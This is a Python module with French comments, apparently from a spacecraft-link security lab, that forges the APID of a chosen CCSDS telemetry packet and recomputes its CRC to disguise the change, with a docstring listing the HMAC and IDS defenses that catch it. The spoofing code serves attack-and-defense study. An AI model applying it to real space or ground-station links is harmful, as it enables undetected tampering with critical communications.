# =============================================================
# alter_apid.py – Attaque 2 / Vecteur 1 : Usurpation d'APID
#
# Remplace l'APID (Application Process ID) d'un paquet CCSDS
# ciblé par un faux APID, puis recalcule le CRC pour masquer
# l'altération. Sans HMAC, le récepteur accepte la trame.
# =============================================================

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
from src.receiver.frame_parser import parse_stream
from src.attacks._utils import rebuildPacket, offsetInStream


def alterApid(
    rawStream: bytes,
    targetSeq: int,
    fakeApid: int,
    verbose: bool = True,
) -> bytes:
    """
    Remplace l'APID d'un paquet par un APID forgé, CRC recalculé.

    L'APID identifie la source applicative du paquet. Un attaquant
    qui usurpe l'APID peut faire passer un paquet malveillant pour
    un paquet légitime d'un autre système.

    Args:
        rawStream:  Flux de paquets CCSDS bruts.
        targetSeq:  seqCount du paquet à altérer.
        fakeApid:   Valeur d'APID forgée (0–2047).
        verbose:    Afficher un log de l'altération.

    Returns:
        Flux modifié avec le paquet altéré et CRC recomputed.

    Détection (Défense 2) :
        → HMAC_FAIL   : le contenu du paquet ne correspond plus au tag
        → APID_SPOOF  : l'IDS structurel signale un APID inattendu
    """
    packets = parse_stream(rawStream)
    result  = bytearray(rawStream)

    for pkt in packets:
        if pkt["seqCount"] != targetSeq:
            continue

        offset = offsetInStream(packets, targetSeq)
        newPkt = rebuildPacket(
            apid       = fakeApid,
            seqFlags   = pkt["seqFlags"],
            seqCount   = pkt["seqCount"],
            version    = pkt["version"],
            packetType = pkt["packetType"],
            secHdrFlag = pkt["secHdrFlag"],
            payload    = pkt["payload"],
        )
        result[offset : offset + pkt["totalSize"]] = newPkt

        if verbose:
            print(
                f"[A2/alterApid] seqCount={targetSeq} : "
                f"APID {pkt['apid']} → {fakeApid}  (CRC recomputed)"
            )
        break

    return bytes(result)
